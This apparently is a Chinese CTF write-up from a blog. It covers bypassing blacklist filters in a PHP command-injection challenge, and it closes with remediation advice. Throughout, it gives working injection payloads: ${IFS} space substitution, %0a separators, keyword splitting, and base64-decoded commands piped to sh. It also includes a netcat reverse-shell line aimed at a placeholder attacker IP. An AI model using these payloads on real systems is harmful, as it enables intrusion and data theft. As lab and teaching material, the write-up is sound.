---
title: "命令注入综合过滤绕过实战：从空格到管道的一条龙"
date: 2026-06-09T01:00:00+08:00
draft: false
tags: ["CTF", "Web安全", "命令注入", "RCE", "绕过", "黑名单"]
categories: ["WriteUp"]
---

## 题目信息

- **类型**：Web / 命令注入（Command Injection）
- **考点**：黑名单过滤绕过、Shell 语法特性、编码与通配符
- **核心漏洞**：`exec()` 直接拼接用户输入，黑名单过滤存在遗漏

---

## 源码分析

题目给了一段典型的命令注入代码，过滤规则逐步加强：

### 第一版：只过滤 `/`

```php
if (!preg_match_all("/\//", $ip, $m)) {
    $cmd = "ping -c 4 {$ip}";
    exec($cmd, $res);
}
```

**分析**：只防了斜杠，但命令注入绝大多数情况下根本不需要 `/`。`;id`、`$(id)`、`` `id` `` 直接通杀。

### 第二版：过滤 `|` 和 `&`

```php
if (!preg_match_all("/(\||\&)/", $ip, $m)) {
    exec("ping -c 4 {$ip}", $res);
}
```

**分析**：禁了管道和后台执行，但 `;` 完全没防，而且 `$()` 也无需任何分隔符。

### 第三版：综合过滤（核心挑战）

```php
if (!preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m)) {
    $cmd = "ping -c 4 {$ip}";
    exec($cmd, $res);
}
```

**黑名单**：`|`、`&`、`;`、**空格**、`/`、`cat`、`flag`、`ctfhub`

---

## 绕过技巧拆解

### 1. 空格绕过：${IFS}

`${IFS}` 是 shell 的内置变量（Internal Field Separator），默认值包含**空格、Tab、换行**。在命令中可以直接代替空格。

```bash
# 正常
cat /flag

# 绕过
cat${IFS}/flag
$(ping${IFS}127.0.0.1)
```

变体：`$IFS$9`（末尾加 `$9` 第九个参数，通常为空，防止变量粘连）。

### 2. 命令分隔符绕过：%0a（换行）

`;` 被过滤后，可以用 URL 编码的换行符 `%0a` 作为命令分隔符：

```
?ip=127.0.0.1%0aid
```

等效于 `127.0.0.1;id`。shell 会把换行当作新的命令行处理。

### 3. 管道/逻辑符绕过：$() 与反引号

`|` 和 `&` 被禁后，不需要用它们来连接命令。`$()` 和 `` ` `` 自带命令执行环境：

```bash
$(id)
$(tac${IFS}/flag)
`whoami`
```

### 4. 关键字绕过：单引号拆词

如果 `cat` 被过滤，可以用单引号将字符串隔断，shell 拼接后仍是原命令：

```bash
ca''t${IFS}/flag    # 等效于 cat /flag
ta''c${IFS}/flag    # 等效于 tac /flag
```

原理：`preg_match` 匹配的是连续子串 `cat`，`ca''t` 中不存在连续的 `cat`。

### 5. 文件名绕过：变量拼接与通配符

`flag` 被过滤后，可以利用 shell 变量展开或通配符匹配：

**变量拼接（推荐，精确可控）：**
```bash
fl${a}ag_1408529428232.php
# $a 未定义时展开为：flag_1408529428232.php
```

> ⚠️ **注意变量边界**：必须写成 `${a}`，不能写 `fl$ag_is_here`，否则 shell 会把 `$ag_is_here` 当成一个完整变量名，展开后变成 `fl`。

**通配符匹配：**
```bash
fl*g_1408529428232.php    # * 匹配任意字符
fl?g_1408529428232.php    # ? 匹配单个字符
```

### 6. 路径绕过：cd 相对路径

`/` 被过滤后，无法直接写绝对路径。利用 `cd ..` 逐层返回根目录，再用相对路径进入目标目录：

```bash
cd ..;cd ..;cd ..;cd etc;tac passwd
```

结合 `%0a` 分隔和 `${IFS}` 代替空格：
```
?ip=%0acd${IFS}..%0acd${IFS}..%0acd${IFS}..%0atac${IFS}fl?g
```

### 7. 编码绕过：base64

如果目标命令必须包含被禁字符（如路径中的 `/`），可以把整个命令 base64 编码后解码执行：

```bash
# 原命令：tac /flag
echo -n 'tac /flag' | base64
# 结果：dGFjIC9mbGFn
```

Payload：
```bash
$(echo${IFS}dGFjIC9mbGFn|base64${IFS}-d|sh)
```

### 8. 无管道 base64 执行

如果 `|` 也被过滤，管道链 `|base64 -d|sh` 无法使用。改用**文件重定向 + 换行**分批执行：

```bash
echo cGluZyAxMjcuMC4wLjE=>a        # 写入 base64 字符串
base64 -d a > b                   # 解码为脚本文件 b
sh b                              # 执行
```

URL 编码后：
```
?ip=echo${IFS}cGluZyAxMjcuMC4wLjE=>a%0abase64${IFS}-d${IFS}a>b%0ash${IFS}b
```

全程无 `|`、无 `;`、无空格、无 `/`、无 `cat`。

---

## 完整利用示例

### 场景：读取 /flag

**环境**：过滤 `| & ; 空格 / cat flag ctfhub`，无回显。

**Payload（变量拼接 + tac + cd）：**
```
?ip=$(cd${IFS}..;cd${IFS}..;cd${IFS}..;tac${IFS}fl${a}ag)
```

**Payload（进入子目录读取 flag 文件）：**
```
?ip=127.0.0.1%0acd${IFS}fl${a}ag_is_here%0aca''t${IFS}fl${a}ag_275201643230443.php
```
解析：
- `127.0.0.1`：让前面的 `ping` 正常执行
- `%0a`：换行分隔，代替 `;`
- `cd${IFS}fl${a}ag_is_here`：`${IFS}` 代替空格，`${a}` 为空，展开为 `cd flag_is_here`
- `ca''t`：单引号拆词绕过 `cat` 过滤
- `fl${a}ag_275201643230443.php`：变量拼接绕过 `flag` 过滤

**Payload（base64 + 写文件）：**
```bash
# 先把结果写入 web 目录便于访问
# 原命令：tac /flag > /var/www/html/a.txt
# base64：dGFjIC9mbGFnID4gL3Zhci93d3cvaHRtbC9hLnR4dA==
```
```
?ip=$(echo${IFS}dGFjIC9mbGFnID4gL3Zhci93d3cvaHRtbC9hLnR4dA==|base64${IFS}-d|sh)
```

### 场景：反弹 Shell

如果 `nc` 存在，且过滤了 `/`，可以用 `cd` 配合或直接写无 `/` 的 payload：

```bash
$(nc${IFS}-e${IFS}sh${IFS}你的IP${IFS}4444)
```

如果 `/dev/tcp` 被限制，用 base64 打包一个完整的 bash 反弹命令解码执行。

---

## 实战截图

下图为 CTFHub 综合过滤练习的实际利用过程。Payload 中同时使用了 `%0a` 换行分隔、`${IFS}` 代替空格、`ca''t` 绕过 `cat` 关键字、`${a}` 分割 `flag` 字符串，最终在响应中回显了 flag。

![CTFHub 命令注入综合过滤成功回显](/san-blog/images/ctfhub-cmd-injection-success.png)

---

## 踩坑记录

1. **变量边界问题**：`fl$ag_is_here` 会被解析为变量 `$ag_is_here`，而不是 `$a` + `g_is_here`。必须用 `${a}` 明确分隔。

2. **`cd` 失败后命令仍在原目录**：如果 `cd` 的目标目录不存在，shell 不会切换目录，后续命令仍在原位置执行。

3. **通配符匹配多个文件**：`fl*g` 如果匹配到多个文件（如 `flag` 和 `flg`），`cat` 会报错。变量拼接更稳妥。

4. **无回显不等于没执行**：`exec($cmd, $res)` 的结果存在 `$res` 数组里，页面如果没打印就看不到。先用 `sleep 5` 或 DNSLog 盲打确认漏洞存在。

---

## 修复建议

1. **永远不要直接拼接用户输入到系统命令**
2. **使用 `escapeshellarg()` 包裹参数**
3. **白名单校验**：如 `filter_var($ip, FILTER_VALIDATE_IP)`
4. **尽量避免调用系统命令**，使用原生函数（如 PHP 的 `socket_create()`）替代 `ping`

---

## 参考

- [PHP escapeshellarg 文档](https://www.php.net/manual/zh/function.escapeshellarg.php)
- POSIX Shell 变量展开规则
- CTFHub 技能树 / Web / RCE
